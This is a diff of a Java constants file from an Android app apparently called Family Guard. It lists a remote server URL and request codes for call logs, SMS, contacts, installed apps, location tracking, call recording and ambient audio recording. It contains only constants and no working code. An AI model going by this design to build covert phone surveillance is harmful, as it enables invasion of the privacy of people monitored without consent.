@@ -1,7 +1,7 @@
 package com.inet.android.request;
 
-public class ConstantRequest {
-	
+public class ConstantValue {
+
 	// -----------shipping address---------
 	final static String MAIN_LINK = "http://family-guard.ru/";
 	final static String APP_TOKEN_LINK = "api/token";
@@ -20,9 +20,9 @@ public class ConstantRequest {
 	final static int TYPE_DATA_REQUEST = 4;
 	final static int TYPE_DEL_REQUEST = 5;
 	final static int TYPE_FILE_REQUEST = 6;
-	
+
 	// -----------type request---------------------
-	
+
 	final public static int TYPE_INFO_REQUEST = 1;
 	final public static int TYPE_INCOMING_CALL_REQUEST = 2;
 	final public static int TYPE_OUTGOING_CALL_REQUEST = 3;
@@ -33,7 +33,22 @@ public class ConstantRequest {
 	final public static int TYPE_LOCATION_TRACKER_REQUEST = 9;
 	final public static int TYPE_IMAGE_REQUEST = 21;
 	final public static int TYPE_AUDIO_REQUEST = 22;
-	
+	// ------------geo mode----------------------
+	final public static int LOCATION_TRACKER_MODE = 41;
+
+	// -----------record data---------------------
+
+	final public static int RECORD_CALL = 30;
+	final public static int RECORD_ENVORIMENT = 31;
+	final public static int RECORD_ENVORIMENT_CALL = 32;
+	final public static int KEY_FOR_RECORD = 33;
+
+	// -----------type a one-time function---------------------
+	final public static int TYPE_LIST_CALL = 51;
+	final public static int TYPE_LIST_SMS = 52;
+	final public static int TYPE_LIST_CONTACTS = 53;
+	final public static int TYPE_LIST_APP = 54;
+
 	// -----------type a one-time request---------------------
 	final public static int TYPE_LIST_CALL_REQUEST = 1;
 	final public static int TYPE_LIST_SMS_REQUEST = 2;
